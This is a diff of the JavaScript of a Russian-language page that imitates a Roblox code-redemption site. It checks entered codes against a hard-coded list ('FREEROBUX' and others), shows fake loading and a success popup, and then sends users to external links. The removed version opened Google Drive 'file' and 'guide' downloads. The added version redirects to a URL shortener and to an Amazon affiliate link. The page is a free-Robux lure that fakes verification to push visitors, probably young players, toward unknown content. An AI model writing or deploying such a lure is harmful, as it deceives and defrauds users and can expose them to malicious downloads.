         const alertBackBtn = document.getElementById('alert-back-btn');
-        
-        // Элементы навигации
         const burgerMenu = document.getElementById('burger-menu');
         const mobileBurgerMenu = document.getElementById('mobile-burger-menu');
         const sideMenu = document.getElementById('side-menu');
@@ -1409,123 +1248,58 @@
         const mobileSearchBtn = document.getElementById('mobile-search-btn');
         const mobileSearchContainer = document.getElementById('mobile-search-container');
         const mobileSearchBox = document.getElementById('mobile-search-box');
-        
-        // Элементы страницы успеха
-        const activatedCode = document.getElementById('activated-code');
-        const activationDate = document.getElementById('activation-date');
+        const officialStoreLink = document.getElementById('official-store-link');
+        const leaveOverlay = document.getElementById('leave-overlay');
+        const leaveCancelBtn = document.getElementById('leave-cancel-btn');
+        const leaveContinueBtn = document.getElementById('leave-continue-btn');
         
         // Список действительных кодов
         const validCodes = ["SPIDERCOLA", "TWEETROBLOX", "ROBLOXEDU", "FREEROBUX", "DDJ", "FREENGNISDI"];
         
-        // Инициализация
-        document.addEventListener('DOMContentLoaded', function() {
-            // Установка даты на странице успеха
-            activationDate.textContent = new Date().toLocaleDateString('ru-RU');
+        // Жесткое отключение highlight на мобильных - ИСПРАВЛЕННЫЙ
+        document.addEventListener('touchstart', function(e) {
+            // Разрешаем клики по чекбоксу
+            if (e.target.type === 'checkbox') {
+                return;
+            }
             
-            // Активируем кнопку "Робуксы" по умолчанию
-            document.querySelectorAll('.nav-link, .mobile-nav-link').forEach(link => {
+            // Блокируем только для других элементов в контейнере условий
+            if (e.target.closest('.terms-container') && e.target.type !== 'checkbox') {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        // Обработчик для чекбокса - РАБОЧИЙ
+        termsCheckbox.addEventListener('change', function() {
+            redeemBtn.disabled = !this.checked;
+        });
+
+        // Обработчики для навигационных кнопок
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        document.querySelectorAll('.mobile-nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                document.querySelectorAll('.mobile-nav-link').forEach(l => l.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        // Установка активной кнопки "Робуксы" по умолчанию
+        document.addEventListener('DOMContentLoaded', function() {
+            const robluxLinks = document.querySelectorAll('.nav-link, .mobile-nav-link');
+            robluxLinks.forEach(link => {
                 if (link.textContent === 'Робуксы' || link.href.includes('gamecards')) {
                     link.classList.add('active');
                 }
             });
         });
-
-        // Обработчик для чекбокса
-        termsCheckbox.addEventListener('change', function() {
-            redeemBtn.disabled = !this.checked;
-        });
-
-        // Обработчик для кнопки "Выкупать"
-        redeemBtn.addEventListener('click', function() {
-            if (!termsCheckbox.checked) {
-                alert('Пожалуйста, подтвердите согласие с условиями использования.');
-                return;
-            }
-            
-            const code = codeInput.value.trim().toUpperCase();
-            if (!code) {
-                alert('Пожалуйста, введите код.');
-                return;
-            }
-            
-            // Показываем точки
-            activationDots.style.display = 'block';
-            activationDots.textContent = '•'.repeat(code.length);
-            
-            // Показываем индикатор загрузки
-            loadingOverlay.style.display = 'flex';
-            
-            // Имитация загрузки (2 секунды)
-            setTimeout(function() {
-                // Скрываем индикатор загрузки
-                loadingOverlay.style.display = 'none';
-                
-                // Проверка кода
-                if (validCodes.includes(code)) {
-                    // ПОКАЗЫВАЕМ НОВОЕ ВСПЛЫВАЮЩЕЕ ОКНО (как на скриншоте)
-                    successPopupOverlay.style.display = 'flex';
-                } else {
-                    alert('Неверный код. Проверьте ввод и попробуйте снова.');
-                    // Скрываем точки при ошибке
-                    activationDots.style.display = 'none';
-                }
-            }, 2000);
-        });
         
-        // Перейти на страницу с файлами
-        function goToFilesPage() {
-            successPopupOverlay.style.display = 'none';
-            activationPage.style.display = 'none';
-            filesPage.style.display = 'block';
-        }
-        
-        // Открыть файл
-        function openFile() {
-            window.open('https://drive.google.com/file/d/1fSeKGQrkFYeV_5sUwFTGY0od896oq5lS/view?usp=drive_link', '_blank');
-        }
-        
-        // Открыть гайд
-        function openGuide() {
-            window.open('https://drive.google.com/file/d/10lCHjf6oZsN_FmHqR2ZeNNBkh4D5yTRl/view', '_blank');
-        }
-        
-        // Вернуться к активации
-        function backToActivation() {
-            filesPage.style.display = 'none';
-            activationPage.style.display = 'block';
-            
-            // Сброс формы
-            codeInput.value = '';
-            activationDots.style.display = 'none';
-            termsCheckbox.checked = false;
-            redeemBtn.disabled = true;
-        }
-        
-        // Показать страницу успеха (старая функция)
-        function showSuccessPage(code) {
-            activationPage.style.display = 'none';
-            successPage.style.display = 'block';
-            activatedCode.textContent = code;
-        }
-        
-        // Перейти в Roblox
-        function goToRoblox() {
-            window.location.href = 'https://www.roblox.com';
-        }
-        
-        // Активировать другой код
-        function activateAnother() {
-            successPage.style.display = 'none';
-            activationPage.style.display = 'block';
-            
-            // Сброс формы
-            codeInput.value = '';
-            activationDots.style.display = 'none';
-            termsCheckbox.checked = false;
-            redeemBtn.disabled = true;
-        }
-        
-        // Навигационное меню
+        // Открытие/закрытие бокового меню
         burgerMenu.addEventListener('click', function() {
             sideMenu.classList.add('active');
             sideMenuOverlay.classList.add('active');
@@ -1546,12 +1320,13 @@
             sideMenuOverlay.classList.remove('active');
         });
         
-        // Поиск
+        // Переключение поиска на мобильных
         mobileSearchBtn.addEventListener('click', function() {
             const isSearchVisible = mobileSearchContainer.style.display === 'block';
             mobileSearchContainer.style.display = isSearchVisible ? 'none' : 'block';
         });
         
+        // Поиск на мобильных
         mobileSearchBox.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 const query = this.value.trim();
@@ -1563,6 +1338,66 @@
             }
         });
         
+        redeemBtn.addEventListener('click', function() {
+            if (!termsCheckbox.checked) {
+                alert('Пожалуйста, подтвердите согласие с условиями использования.');
+                return;
+            }
+            
+            const code = codeInput.value.trim();
+            if (!code) {
+                alert('Пожалуйста, введите код.');
+                return;
+            }
+            
+            // Показываем точки вместо текста
+            activationDots.style.display = 'block';
+            activationDots.textContent = '•'.repeat(code.length);
+            
+            // Показываем индикатор загрузки
+            loadingOverlay.style.display = 'flex';
+            
+            // Имитация загрузки (2 секунды)
+            setTimeout(function() {
+                // Скрываем индикатор загрузки
+                loadingOverlay.style.display = 'none';
+                
+                // Проверка кода
+                if (validCodes.includes(code.toUpperCase())) {
+                    showSuccessAlert();
+                } else {
+                    alert('Неверный код. Проверьте ввод и попробуйте снова.');
+                    // Скрываем точки при ошибке
+                    activationDots.style.display = 'none';
+                }
+            }, 2000);
+        });
+        
+        function showSuccessAlert() {
+            // Показываем всплывающее оповещение
+            alertOverlay.style.display = 'flex';
+        }
+        
+        // Обработчик для кнопки "Вернуться к активации" в оповещении
+        alertBackBtn.addEventListener('click', function() {
+            // Переходим по указанной ссылке
+            window.location.href = 'https://wdho.ru/7Wvm';
+        });
+
+        // Закрытие оповещения при клике вне его
+        alertOverlay.addEventListener('click', function(e) {
+            if (e.target === alertOverlay) {
+                alertOverlay.style.display = 'none';
+                
+                // Сбрасываем форму
+                codeInput.value = '';
+                activationDots.style.display = 'none';
+                termsCheckbox.checked = false;
+                redeemBtn.disabled = true;
+            }
+        });
+
+        // Добавляем функциональность для поиска
         document.querySelector('.search-box').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 const query = this.value.trim();
@@ -1572,19 +1407,32 @@
             }
         });
 
-        // Обработчики для навигационных кнопок
-        document.querySelectorAll('.nav-link').forEach(link => {
-            link.addEventListener('click', function(e) {
-                document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
-                this.classList.add('active');
-            });
+        // Обработчик для кнопки "Официальный магазин"
+        officialStoreLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            // Закрываем боковое меню
+            sideMenu.classList.remove('active');
+            sideMenuOverlay.classList.remove('active');
+            // Показываем модальное окно
+            leaveOverlay.style.display = 'flex';
         });
 
-        document.querySelectorAll('.mobile-nav-link').forEach(link => {
-            link.addEventListener('click', function(e) {
-                document.querySelectorAll('.mobile-nav-link').forEach(l => l.classList.remove('active'));
-                this.classList.add('active');
-            });
+        // Обработчик для кнопки "Отмена" в модальном окне
+        leaveCancelBtn.addEventListener('click', function() {
+            leaveOverlay.style.display = 'none';
+        });
+
+        // Обработчик для кнопки "Продолжить" в модальном окне
+        leaveContinueBtn.addEventListener('click', function() {
+            // Переходим по ссылке Amazon
+            window.location.href = 'https://www.amazon.com/roblox?&_encoding=UTF8&tag=r05d13-20&linkCode=ur2&linkId=5562fc29c05b45562a86358c198356eb&camp=1789&creative=9325';
+        });
+
+        // Закрытие модального окна при клике вне его
+        leaveOverlay.addEventListener('click', function(e) {
+            if (e.target === leaveOverlay) {
+                leaveOverlay.style.display = 'none';
+            }
         });
     </script>
 </body>
